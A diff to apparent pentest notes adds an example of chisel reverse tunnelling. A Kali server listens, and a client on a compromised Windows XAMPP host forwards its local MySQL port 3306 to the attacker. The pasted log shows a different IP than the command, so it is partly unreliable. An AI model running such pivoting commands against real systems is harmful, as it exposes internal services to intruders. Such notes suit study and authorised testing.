@@ -13,3 +13,20 @@ chisel.exe client 192.168.119.125:9002 192.168.119.125:445 R:445:localhost:445
 #port forwarding
 ./chisel server -p 8083 --reverse
 ./chisel client 192.168.1.99:8083 R:6379:127.0.0.1:6379
+
+
+#Exampel for mssql
+
+┌──(kali㉿kali)-[~]
+└─$ chisel server -p 8000 --reverse
+2022/03/21 14:21:59 server: Reverse tunnelling enabled
+2022/03/21 14:21:59 server: Fingerprint YqJoP81ML0mrD3p2Mhd+Ix6WRr1Wb7e61RFzukVAP3Q=
+2022/03/21 14:21:59 server: Listening on http://0.0.0.0:8000
+
+
+PS C:\xampp\htdocs\tmp\> .\chisel.exe client 192.168.213.128:8000 R:3306:127.0.0.1:3306
+chisel.exe client 192.168.213.128:8000 R:3306:127.0.0.1:3306
+2022/03/21 11:17:46 client: Connecting to ws://192.168.118.23:8000
+2022/03/21 11:17:47 client: Connected (Latency 201.072ms)
+
+
